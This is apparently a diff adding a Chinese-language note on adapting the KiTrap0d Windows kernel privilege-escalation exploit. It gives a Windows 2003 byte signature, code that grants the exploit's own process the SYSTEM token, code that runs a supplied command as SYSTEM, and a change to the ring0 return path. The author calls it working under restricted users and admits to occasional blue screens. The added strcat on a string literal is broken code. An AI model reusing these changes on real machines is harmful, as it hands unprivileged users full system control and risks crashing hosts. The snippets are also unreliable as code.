@@ -1,0 +1,30 @@
+MsW1nd0ws NtVdmControl()->KiTrap0d ring0 eXplo1t
+
+修改如下:
+
+vdmallowed.c
+
+1、Win2003的特征搜寻,可利用下面通用序列,定位后+0x13
+
+    { "\x63\x3F\xFB\x6A\x00\x6A\x00\xE8" }, // Windows 2003
+
+2、为了方面直接System下执行指令及其它程序,改PrepareProcessForSystemToken子过程为获取Exp本身的pid
+
+static BOOL PrepareProcessForSystemToken(PCHAR App, PDWORD ProcessId)
+{
+   *ProcessId = GetCurrentProcessId();
+    return TRUE;
+}
+
+3、执行外加参数
+
+if(argc>=2){ LogMessage(L_INFO,strcat("Execute command: ",__argv[1]));
+   WinExec(__argv[1],1);}
+}
+
+vdmexploit.c
+
+没修改什么了，把提权后的ring0死循环，改成了正常的返回 _asm retn 8。
+
+
+经过这样改造后,正常Gui下和限制性用户环境下，都可以顺利执行。至于偶尔少数机器BSOD问题，未继续跟踪了。
